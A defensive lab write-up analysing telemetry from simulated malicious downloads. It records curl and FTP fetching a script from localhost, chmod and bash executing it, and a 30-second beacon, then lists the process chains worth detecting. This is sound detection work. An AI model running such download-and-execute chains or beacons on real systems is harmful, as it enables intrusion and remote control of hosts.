# Suspicious File Download Activity - Telemetry Analysis

## Objective

Analyze raw telemetry collected during suspicious file download simulations.

The purpose of this phase is to:

* examine collected telemetry sources
* evaluate telemetry visibility
* identify suspicious activity
* identify suspicious process relationships
* identify observable execution patterns
* determine whether sufficient evidence exists for further investigation

No ATT&CK mapping or detection logic is performed during this phase.

---

# Telemetry Sources Collected

## Variant 1 - HTTP Delivery

### Auditd

Captured:

* process execution events
* command-line arguments
* parent-child relationships
* working directories
* executed binaries

Observed executables:

* curl
* chmod
* bash
* hostname
* sleep

---

### TCPDump

Captured:

* HTTP session establishment
* HTTP GET requests
* HTTP responses
* periodic outbound callbacks

Observed traffic:

* GET /update.sh
* GET /heartbeat

---

### HTTP Listener Logs

Captured:

* inbound HTTP requests
* requested resources
* request timestamps
* server responses

Observed requests:

* /update.sh
* /heartbeat

---

## Variant 2 - FTP Delivery

### Auditd

Captured:

* ftp client execution
* permission modification activity
* script execution
* beaconing activity

Observed executables:

* ftp
* chmod
* bash
* hostname
* curl
* sleep

---

### TCPDump

Captured:

* FTP connection establishment
* FTP control channel activity
* periodic HTTP callbacks

Observed traffic:

* FTP connection
* HTTP heartbeat traffic

---

### FTP Server Logs

Captured:

* FTP session establishment
* authentication activity
* file transfer activity

Observed actions:

* user login
* file retrieval

---

### Downloaded Payload Metadata

Captured:

* filename
* path
* permissions
* ownership

Observed artifact:

```text
/home/bunny/update.sh
```

---

# Variant 1 Analysis

## Initial Download Activity

Observed command:

```bash
curl http://127.0.0.1:8080/update.sh -o /tmp/update.sh
```

### Visibility

Auditd provides:

* executable name
* full command line
* destination file path

TCPDump provides:

* exact URI requested
* server response

HTTP listener logs provide:

* successful request confirmation

### Assessment

High-fidelity visibility.

All telemetry sources independently confirm the same activity.

---

## File Preparation Activity

Observed command:

```bash
chmod +x /tmp/update.sh
```

### Visibility

Auditd records:

* permission modification
* target file

### Assessment

The downloaded file is intentionally prepared for execution.

This is commonly observed before script execution.

---

## Script Execution Activity

Observed command:

```bash
/bin/bash /tmp/update.sh
```

### Visibility

Auditd records:

* interpreter execution
* script path
* parent-child relationship

### Assessment

A downloaded file is executed through bash shortly after retrieval.

This creates a strong execution chain.

---

## Child Process Analysis

Observed child processes:

```text
update.sh
 ├── hostname
 ├── curl
 └── sleep
```

### Visibility

Auditd records all child executions.

### Assessment

The script spawns multiple system utilities after execution.

This behavior indicates active script logic rather than a benign file retrieval.

---

## Repeating Network Activity

Observed sequence:

```text
hostname
curl
sleep 30
```

repeated continuously.

TCPDump confirms:

```text
GET /heartbeat
GET /heartbeat
GET /heartbeat
```

at approximately 30-second intervals.

HTTP logs confirm identical timing.

### Assessment

The execution pattern is highly repetitive and machine-driven.

Periodic outbound communication is observable.

---

# Variant 2 Analysis

## FTP Session Activity

Observed command:

```bash
ftp 127.0.0.1
```

### Visibility

Auditd captures:

* ftp client execution

TCPDump captures:

* FTP session establishment

### Assessment

Connection activity is visible.

Actual file retrieval commands are not visible through auditd.

---

## File Acquisition Evidence

No direct process execution records exist for file transfer.

However, later telemetry shows:

```text
update.sh
```

present within the user's home directory.

### Assessment

The file appears after the FTP session and before execution.

Evidence strongly suggests successful transfer.

---

## File Preparation Activity

Observed command:

```bash
chmod +x update.sh
```

### Visibility

Auditd records:

* permission modification
* target file

### Assessment

Downloaded content is being prepared for execution.

---

## Script Execution Activity

Observed command:

```bash
/bin/bash ./update.sh
```

### Visibility

Auditd records:

* interpreter execution
* script path
* parent-child relationship

### Assessment

The newly acquired file is executed.

---

## Child Process Analysis

Observed child processes:

```text
update.sh
 ├── hostname
 ├── curl
 └── sleep
```

### Assessment

Identical behavior to Variant 1.

The delivery mechanism changes.

Post-execution behavior remains consistent.

---

## Repeating Network Activity

Observed sequence:

```text
hostname
curl
sleep 30
```

repeated continuously.

TCPDump confirms recurring HTTP requests.

### Assessment

Consistent periodic outbound communication is observable.

---

# Suspicious Process Chains

## Variant 1

```text
curl
 └── download update.sh

chmod
 └── modify permissions

bash update.sh
 ├── hostname
 ├── curl
 └── sleep
```

### Why Suspicious

* remote retrieval
* execution shortly after download
* permission modification before execution
* recurring outbound communications

---

## Variant 2

```text
ftp
 └── retrieve update.sh

chmod
 └── modify permissions

bash update.sh
 ├── hostname
 ├── curl
 └── sleep
```

### Why Suspicious

* external file acquisition
* permission modification
* execution of newly acquired file
* recurring network communications

---

# Telemetry Quality Assessment

## Auditd

### Strengths

* excellent process visibility
* captures command-line arguments
* captures parent-child relationships
* captures execution timelines

### Limitations

* no visibility into HTTP payload contents
* limited visibility into FTP file transfer operations

---

## TCPDump

### Strengths

* captures network communication patterns
* captures payload delivery visibility
* captures callback timing

### Limitations

* lacks process attribution
* cannot identify originating process without correlation

---

## Listener Server Logs

### Strengths

* confirms resource requests
* provides server-side validation

### Limitations

* no host process visibility

---

## Payload Metadata

### Strengths

* confirms file existence
* confirms execution preparation

### Limitations

* does not identify acquisition mechanism

---

# Findings Forwarded To Investigation

The following observations require investigation:

1. Retrieval of executable script from remote service.
2. Permission modification immediately before execution.
3. Execution of newly acquired script through bash.
4. Child process creation involving hostname, curl, and sleep.
5. Repetitive outbound HTTP communications occurring at approximately 30-second intervals.
6. Strong execution chain linking acquisition, execution, and network activity.
7. Consistent behavioral pattern across multiple delivery mechanisms.

---

# Detection Takeaways

Potential detection opportunities observed during telemetry analysis:

* command-line based file download activity
* FTP client execution followed by script execution
* execution of files shortly after acquisition
* permission modification followed by execution
* bash spawning curl
* repeated curl executions at fixed intervals
* recurring network communications with consistent timing
* suspicious process chains involving:

```text
curl -> bash
ftp -> bash
bash -> curl
bash -> hostname
bash -> sleep
```

These observations will be evaluated further during the Investigation phase.
